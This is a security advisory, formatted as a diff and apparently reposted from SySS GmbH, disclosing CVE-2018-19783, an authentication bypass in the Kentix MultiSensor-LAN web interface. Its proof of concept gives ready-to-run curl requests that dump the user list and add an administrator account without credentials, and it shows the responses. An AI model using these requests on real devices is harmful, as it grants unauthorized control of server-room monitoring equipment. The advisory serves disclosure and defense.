@@ -1,0 +1,122 @@
+id: 31994
+date: 01/20/2019
+title: Kentix MultiSensor-LAN 5.63.00 Authentication Bypass Vulnerability
+author: Micha Borrmann
+cves: CVE-2018-19783
+
+Product:                   MultiSensor-LAN
+Manufacturer:              Kentix GmbH
+Affected Version(s):       5.63.00 <= 
+Tested Version(s):         5.60.01, 5.63.00
+Vulnerability Type:        Authentication Bypass Using an Alternate Path or Channel (CWE-288)
+Risk Level:                High
+Solution Status:           Open
+Manufacturer Notification: 2018-12-03
+Solution Date:             -
+Public Disclosure:         2019-01-17
+CVE Reference:       CVE-2018-19783
+Authors of Advisory:       Micha Borrmann (SySS GmbH)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+Kentix MultiSensor LAN is a web-based management solution for monitoring
+server rooms (see [1]).
+
+The web site authentication can be bypassed to add another administrator
+account.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+The web based application is not using a usual session concept with
+a session cookie for managing authenticated user sessions. Some URLs
+are protected with HTTP Basic Authentication, but the user management
+web page can be accessed and used without any authentication.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+The current user list can be read out without any authentication (all
+values are Base64-encoded) using the following HTTP request:
+
+$ curl --data 'action=0&A05000=1' --url http://$TARGETIP/io
+{
+"A05001":"YWRtaW4=",
+"A05002":"KioqKioq",
+"A05003":"",
+"A05021":"MASKED",
+"A05022":"KioqKioq",
+"A05023":"MASKED",
+"A05041":"MASKED",
+"A05042":"KioqKioq",
+"A05043":"MASKED",
+"A05061":"",
+"A05062":"",
+"A05063":"",
+"A05081":"",
+"A05082":"",
+"A05083":""
+}
+
+There are five possible accounts, which are represented with the
+fields A0500[1-3], A0502[1-3], and so on.  The first field is the user
+name, the second is the masked password, and the last one is the
+optional e-mail address.
+
+With the following simple HTTP request another user account is
+created (username and password are sent Base64-encoded, too):
+
+$ curl --data 'action=1&A05061=MWJj&A05062=MWJj&save=3' --url http://$TARGETIP/io
+{
+"A05061":"MWJj",
+"A05062":"KioqKioq"
+}
+
+With this created account, the web interface can be used very easily.
+It can be verified that the user account was added successfully via
+the previously shown HTTP request:
+
+$ curl --data 'action=0&A05000=1' --url http://$TARGETIP/io
+{
+"A05001":"YWRtaW4=",
+"A05002":"KioqKioq",
+"A05003":"",
+"A05021":"MASKED",
+"A05022":"KioqKioq",
+"A05023":"MASKED",
+"A05041":"MASKED",
+"A05042":"KioqKioq",
+"A05043":"MASKED",
+"A05061":"MWJj",
+"A05062":"KioqKioq",
+"A05063":"",
+"A05081":"",
+"A05082":"",
+"A05083":""
+}
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+As there was no response from the vendor, SySS GmbH is not aware of a
+solution for this security issue.
+
+Kentix MultiSensor LAN devices should be operated only in firewall
+protected LANs with enabled network access control to reduce the risk
+of unauthorized manipulations.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+
+2018-11-30: Detection of the vulnerability
+2018-12-01: CVE number assigned
+2018-12-03: Vulnerability reported to manufacturer
+2019-01-17: Public release of the security advisory
+
+#  0day.today [2023-03-24]  #
